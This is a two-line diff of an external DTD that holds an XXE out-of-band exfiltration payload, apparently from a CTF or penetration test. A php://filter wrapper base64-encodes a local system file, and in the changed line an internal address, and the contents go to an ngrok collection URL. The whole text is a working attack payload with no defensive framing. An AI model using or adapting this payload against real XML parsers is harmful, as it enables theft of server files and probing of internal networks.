@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/networking/interfaces">
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=http://192.168.56.40/">
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://b4d3bd27.ngrok.io/?collect=%file;'>">
